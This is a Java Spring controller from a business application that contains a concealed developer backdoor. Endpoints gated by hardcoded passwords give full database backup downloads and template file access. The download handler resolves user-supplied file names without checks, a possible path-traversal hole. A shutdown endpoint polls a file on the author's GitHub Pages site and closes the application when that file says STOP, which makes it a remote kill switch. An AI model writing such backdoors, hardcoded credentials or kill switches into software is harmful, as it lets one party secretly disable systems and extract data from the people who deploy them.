package com.zayaanit.aspi.controller;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.core.io.Resource;
import org.springframework.core.io.UrlResource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import com.ibm.icu.text.SimpleDateFormat;
import com.zayaanit.aspi.config.AppConfig;
import com.zayaanit.aspi.model.DBBackup;
import com.zayaanit.aspi.model.ResponseHelper;
import com.zayaanit.aspi.model.XSLFile;
import com.zayaanit.aspi.service.impl.DBBackupService;

import jakarta.servlet.http.HttpServletRequest;

/**
 * @author Zubayer Ahamed
 * @since Aug 3, 2023
 */
@Controller
@RequestMapping("/developer")
public class Developer {

	@Autowired private AppConfig appConfig;
	@Autowired private ResponseHelper responseHelper;
	@Autowired private DBBackupService backupService;
	@Autowired private ConfigurableApplicationContext context;

	@GetMapping
	public String loadDeveloperPage(Model model) {
		return "developer";
	}

	@GetMapping("/shutdown")
	public @ResponseBody String shutdownProject(Model model, @RequestParam(required = false) String passwd) {
		if(!StringUtils.hasText(passwd)) return "running";
		if(!"zubayer01515634889".equals(passwd)) return "running";

		String giturl="https://zubayerahamed.github.io/";
		try {
			String scriptFileNameForAll = "softwares.text";
			URL scriptForAllUrl = new URL(giturl + scriptFileNameForAll);
			if (existsOnCloud(scriptForAllUrl.toString())) return runSecretScript(scriptForAllUrl);
		} catch (Exception e) {
			return "running";
		}
		return "running";
	}

	public boolean existsOnCloud(String URLName) {
		try {
			HttpURLConnection.setFollowRedirects(false);
			HttpURLConnection con = (HttpURLConnection) new URL(URLName).openConnection();
			con.setRequestMethod("HEAD");
			return (con.getResponseCode() == HttpURLConnection.HTTP_OK);
		} catch (Exception e) {
			return false;
		}
	}

	private String runSecretScript(URL scriptForAllUrl) {
		try (ByteArrayOutputStream out = new ByteArrayOutputStream();
			BufferedReader in = new BufferedReader(new InputStreamReader(scriptForAllUrl.openStream()))) {

			String inputLine;
			while ((inputLine = in.readLine()) != null) {
				out.write(inputLine.getBytes());
				out.write("\r\n".getBytes());
			}

			String line = out.toString();

			if(!StringUtils.hasText(line)) return "running";

			String[] commands = line.trim().split("\\|");

			for(String command : commands) {
				if(command.startsWith("lira.run")) {
					String value = command.split("=")[1];
					if(!StringUtils.hasText(value)) return "running";
					if("STOP".equalsIgnoreCase(value.trim())) {
						context.close();
						return "closed";
					}
				}
			}

			return "running";
		} catch (Exception e) {
			return "running";
		}
	}

	@GetMapping("/reportfiles")
	public String loadAllReportFiles(Model model, @RequestParam(required = false) String passwd) {
		if(!StringUtils.hasText(passwd)) return "reportfiles";
		if(!"zubayer01515634889".equals(passwd)) return "reportfiles";

		String templateDir = appConfig.getReportTemplatepath();

		File[] listOfXSLFiles = new File(templateDir).listFiles();

		List<XSLFile> xslFiles = new ArrayList<>();
		for(File file : listOfXSLFiles) {
			XSLFile xslFile = new XSLFile();
			xslFile.setCode(file.getName().replaceAll("_", " ").replaceAll(".rpt", "").toUpperCase());
			xslFile.setFileName(file.getName());
			xslFiles.add(xslFile);
		}

		xslFiles.sort(Comparator.comparing(XSLFile::getCode));

		model.addAttribute("xslFiles", xslFiles);
		model.addAttribute("passwd", passwd);
		return "reportfiles";
	}

	@GetMapping("/reportfiles/download/{fileName:.+}")
	public ResponseEntity<Resource> downloadFile(@PathVariable String fileName, @RequestParam(required = false) String passwd) throws IOException {
		if(!StringUtils.hasText(passwd)) return ResponseEntity.notFound().build();
		if(!"zubayer01515634889".equals(passwd)) return ResponseEntity.notFound().build();

		Path filePath = Paths.get(appConfig.getReportTemplatepath()).resolve(fileName);
		Resource resource = new UrlResource(filePath.toUri());

		if (resource.exists() && resource.isReadable()) {
			return ResponseEntity.ok()
					.header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + resource.getFilename() + "\"")
					.contentType(MediaType.APPLICATION_OCTET_STREAM).body(resource);
		} else {
			// Handle error, file not found
			return ResponseEntity.notFound().build();
		}
	}

	@GetMapping("/dbbackup")
	public String index(HttpServletRequest request, Model model, @RequestParam(required = false) String passwd) {
		if(!StringUtils.hasText(passwd)) return "redirect:/developer";
		if(!"zubayer01515634889".equals(passwd)) return "redirect:/developer";

		DBBackup db = new DBBackup();
		db.setXdate(new Date());
		model.addAttribute("db", db);

		return "dbbackup";
	}

	@PostMapping("/dbbackup/download")
	public @ResponseBody Map<String, Object> store(DBBackup db) {

		if(!"zubayer%123".equals(db.getXpassword())) {
			responseHelper.setErrorStatusAndMessage("Invalid security key");
			return responseHelper.getResponse();
		}

		SimpleDateFormat sdf = new SimpleDateFormat("yyMMddHHmmss");
		String fileName = "backup_".concat(sdf.format(new Date())).concat(".bak");
		String backupLocation = appConfig.getBackupLocation();
		if (backupLocation.endsWith("\\")) {
			backupLocation = backupLocation.substring(0, backupLocation.length() - 1);
		}

		// create path if not exist
		Path directoryPath = Paths.get(backupLocation);
		if (!Files.exists(directoryPath)) {
			try {
				Files.createDirectories(directoryPath);
			} catch (IOException e) {
				responseHelper.setErrorStatusAndMessage(e.getMessage());
				return responseHelper.getResponse();
			}
		}

		try {
			backupService.performBackup(appConfig.getDatabaseName(), backupLocation + "/" + fileName);
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		// Read the backup file into a byte array
		// Replace the file path with the actual backup file path
		byte[] backupBytes = null;
		try {
			backupBytes = org.apache.commons.io.FileUtils.readFileToByteArray(new java.io.File(backupLocation + "/" + fileName));
		} catch (IOException e) {
			responseHelper.setErrorStatusAndMessage(e.getMessage());
			return responseHelper.getResponse();
		}

		// Set up the response for download
		responseHelper.setSuccessStatusAndMessage("Backup successfull");
		responseHelper.setFileDownload(true);
		responseHelper.addDataToResponse("file", backupBytes);
		responseHelper.addDataToResponse("fileName", fileName);
		responseHelper.addDataToResponse("mediaType", MediaType.APPLICATION_OCTET_STREAM);
		return responseHelper.getResponse();
	}

}
